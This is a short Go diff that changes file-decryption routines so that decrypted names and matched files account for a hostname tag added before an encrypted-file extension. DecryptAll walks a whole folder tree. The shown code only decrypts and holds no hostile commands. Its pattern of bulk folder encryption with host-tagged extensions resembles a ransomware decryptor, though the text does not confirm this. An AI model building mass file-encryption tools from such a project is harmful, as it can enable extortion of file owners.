@@ -9,7 +9,7 @@ import (
 // Decrypt : decrypts file with key
 func Decrypt(fileSrc string, key *[]byte) (string, error) {
 
-	decryptedFileName := fileSrc[0 : len(fileSrc)-len(EncryptedExt)]
+	decryptedFileName := fileSrc[0 : len(fileSrc)-(len(EncryptedExt)+len(HostName))]
 	encryptedFile, err := os.Open(fileSrc)
 
 	counter := []byte{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
@@ -98,7 +98,7 @@ func DecryptAll(rootFolder string, key *[]byte) (uint64, error) {
 					wg.Done()
 					return
 				}
-				if file[len(file)-len(EncryptedExt):] == EncryptedExt {
+				if file[len(file)-(len(EncryptedExt)+len(HostName)):] == HostName+EncryptedExt {
 					_, err := Decrypt(file, key)
 					if err == nil {
 						mutex.Lock()
